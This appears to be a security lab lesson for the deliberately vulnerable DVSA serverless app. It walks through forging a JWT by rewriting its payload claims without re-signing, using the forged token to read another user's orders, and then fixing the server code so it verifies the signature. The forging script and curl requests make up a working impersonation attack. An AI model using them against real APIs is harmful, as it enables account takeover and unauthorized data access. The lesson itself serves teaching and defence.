# Lesson 02 - Broken Authentication

> Use only the attacker and victim accounts created inside your DVSA lab. Tokens must be redacted before committing.

## Environment

```bash
export API="https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order"
export TOKEN_B="<attacker-jwt>"
export TOKEN_C="<victim-jwt>"
```

## Decode JWT payloads

```bash
python3 - <<'PY'
import os, json, base64

def decode(token):
    payload = token.split('.')[1]
    payload += '=' * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode()))

for name in ["TOKEN_B", "TOKEN_C"]:
    data = decode(os.environ[name])
    print("\n" + name)
    print("username:", data.get("username"))
    print("sub     :", data.get("sub"))
PY
```

## Save victim identity

```bash
export VICTIM_USER="<victim-username-or-sub>"
```

## Confirm normal behavior with attacker token

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data '{"action":"orders"}' | jq
```

## Forge token by editing payload only

```bash
export FAKE_AS_C="$(
python3 - <<'PY'
import os, json, base64

t = os.environ["TOKEN_B"]
victim = os.environ["VICTIM_USER"]
h, p, s = t.split('.')
p += '=' * (-len(p) % 4)
data = json.loads(base64.urlsafe_b64decode(p.encode()))

data["username"] = victim
data["sub"] = victim

newp = base64.urlsafe_b64encode(
    json.dumps(data, separators=(",", ":")).encode()
).rstrip(b"=").decode()
print(f"{h}.{newp}.{s}")
PY
)"
```


## Use forged token pre-fix

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $FAKE_AS_C" \
  --data '{"action":"orders"}' | jq
```

## Fetch a specific victim order pre-fix

```bash
export ORDER_C="<victim-order-id>"

curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $FAKE_AS_C" \
  --data '{"action":"get","order-id":"'"$ORDER_C"'"}' | jq
```

## Fix code pattern

Vulnerable pattern:

```javascript
var auth_header = headers.Authorization || headers.authorization;
var token_sections = auth_header.split('.');
var auth_data = jose.util.base64url.decode(token_sections[1]);
var token = JSON.parse(auth_data);
var user = token.username;
```

Fixed pattern summary:

```javascript
var auth_header = (headers.Authorization || headers.authorization || "");
var jwt = auth_header.replace(/^Bearer\s+/i, "").trim();
if (!jwt) {
  return callback(null, resp(401, { status: "err", msg: "missing authorization" }));
}

verifyCognitoJwt(jwt).then((claims) => {
  var user = claims.username || claims["cognito:username"] || claims.sub;
  if (!user) {
    return callback(null, resp(401, { status: "err", msg: "missing subject" }));
  }
  var isAdmin = false;
```

## Post-fix verification

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $FAKE_AS_C" \
  --data '{"action":"orders"}' | jq
```

Expected result: invalid token / unauthorized response.
